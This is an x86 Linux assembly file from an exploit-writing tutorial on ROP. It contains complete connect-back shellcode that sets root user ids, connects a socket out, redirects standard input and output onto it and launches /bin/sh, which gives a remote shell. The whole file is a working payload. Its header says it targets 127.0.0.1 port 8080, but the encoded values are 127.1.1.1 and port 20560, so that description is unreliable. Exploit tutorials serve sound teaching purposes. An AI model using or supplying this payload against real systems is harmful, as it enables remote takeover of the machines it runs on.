;
; Date: September 18 2015
; Author: Vincent Dary
; File: connect_back_shellcode.asm
;
; Architecture: Intel x86
; Plateform: GNU/Linux
;
; Description:
; Exploit Writing Tutorial: ROP with Shellcode.
; Connect-back shellcode to 127.0.0.1 on port 8080.
;
; Compile line: 
; nasm connect_back_shellcode.asm
;

BITS 32

; setresuid(0, 0, 0);
xor     eax, eax
mov     al, 0xa4
xor     ebx, ebx
xor     ecx, ecx
xor     edx, edx
int     0x80

; fd = socket(2, 1, 0)
; fd = socketcall(1, [2, 1, 0])
push    BYTE 0x66
pop     eax
xor     ebx, ebx
inc     ebx
cdq
push    edx
push    BYTE 0x1
push    BYTE 0x2
mov     ecx, esp
int     0x80

; fd = connect(fd, [2, <port>, <addr ip>], 16)
; fd = socketcall(fd, [fd, [2, <port>, <addr ip>], 16])
xchg    esi, eax
push    BYTE 0x66
pop     eax
inc     ebx
push    DWORD 0x0101017f
push    WORD 0x5050
push    WORD bx
mov     ecx, esp
push    BYTE 0x10
push    ecx
push    esi
mov     ecx, esp
inc     ebx
int     0x80

; dup2(fd, 2)
; dup2(fd, 1)
; dup2(fd, 0)
xchg    esi, ebx
push    BYTE 0x2
pop     ecx
dup_loop_connector:
mov     BYTE al, 0x3F
int     0x80
dec     ecx
jns     dup_loop_connector

; execve("/bin//sh", ["/bin//sh"], 0)
mov     BYTE al, 11
push    edx
push    0x68732F2F
push    0x6E69622F
mov     ebx, esp
push    edx
mov     edx, esp
push    ebx
mov     ecx, esp
int     0x80

